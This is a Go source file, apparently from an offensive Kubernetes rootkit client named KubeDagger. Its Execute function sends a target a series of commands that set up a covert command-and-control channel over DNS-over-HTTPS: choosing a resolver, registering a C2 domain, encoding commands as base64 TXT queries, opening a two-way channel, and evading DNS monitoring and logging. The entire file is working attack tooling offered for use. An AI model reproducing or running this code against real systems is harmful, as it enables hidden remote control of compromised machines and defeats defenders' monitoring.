package doh_c2

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/shared"
)

type DoHC2Result struct {
	Actions []shared.ActionInfo `json:"actions"`
	Success bool                `json:"success"`
}

func Execute(target, resolver, domain, output string) error {
	result := &DoHC2Result{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"configure_doh_resolver",
			"set DoH endpoint (Cloudflare/Google/custom) for encrypted DNS C2 transport",
			"doh_c2_set_resolver",
		},
		{
			"register_c2_domain",
			"configure authoritative domain for TXT record command encoding",
			"doh_c2_set_domain",
		},
		{
			"encode_commands_txt",
			"encode C2 commands as base64 TXT record queries via DoH",
			"doh_c2_encode_cmd",
		},
		{
			"establish_channel",
			"initiate bidirectional C2 channel through DoH TXT record queries/responses",
			"doh_c2_establish",
		},
		{
			"bypass_dns_monitoring",
			"route all DNS through HTTPS to evade traditional DNS monitoring and logging",
			"doh_c2_bypass_monitor",
		},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + resolver + "#" + domain
		status := shared.SendCommand(target, "/doh_c2", cmd)
		result.Actions = append(result.Actions, shared.ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = shared.AllSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
